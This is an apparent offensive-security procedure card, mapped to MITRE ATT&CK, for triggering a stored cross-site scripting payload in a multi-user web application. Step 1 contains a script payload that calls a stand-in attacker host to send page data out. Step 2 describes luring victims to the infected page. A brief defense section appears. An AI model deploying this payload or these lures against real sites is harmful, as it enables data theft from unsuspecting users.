---
id: p2b3c4d5-e6f7-8901-bcde-f2345678901
name: Trigger-XSS-Execution-in-Victim-Browser
tags:
  - xss
  - execution
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:53.521Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-Execution-in-Victim-Browser

## Summary

This procedure describes how the stored malicious script in the DoD application executes when a victim loads the affected page, running JavaScript in their browser context to enable further exploitation.

## Description

Once injected, the payload is rendered unsafely in HTML, executing in the victim's browser upon page load. This targets shared views in the application, affecting other authenticated users. No additional attacker interaction is needed post-injection; execution relies on victim access. Outcomes include arbitrary code running with victim privileges, such as accessing local storage or sending requests.

## Requirements

1. Payload already stored from prior injection
2. Victim access to the infected page (e.g., via shared link or natural navigation)
3. Attacker-controlled endpoint for exfiltration (e.g., a server to receive data)

## Defense

Defensive measures and detection strategies:

- Enforce strict XSS filters and sanitize all outputs
- Implement user education on suspicious links
- Log and alert on unusual browser behaviors or outbound requests from the app

## Objectives

1. Trigger script execution in victim context
2. Confirm execution via test alert or beacon
3. Prepare for impact actions like data theft

## Instructions

### Step 1: Prepare Malicious Payload

**Context**: Update the stored payload to include execution logic, such as a beacon to attacker server.

If re-injecting, use: `<script>fetch('http://attacker.com/log?user='+document.domain)</script>`.

### Step 2: Direct Victim to Infected Content

**Context**: Lure the victim to view the page displaying the stored data.

Share a direct link to the vulnerable feature or wait for organic access in a multi-user environment.

**Expected Output**: Victim's browser loads the page, executing the script silently.

### Step 3: Monitor Execution

**Context**: Observe signs of successful trigger from attacker side.

Check server logs for incoming requests from the victim's IP.

**Expected Output**: HTTP request to attacker endpoint with domain or user info.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- trigger
- browser-execution
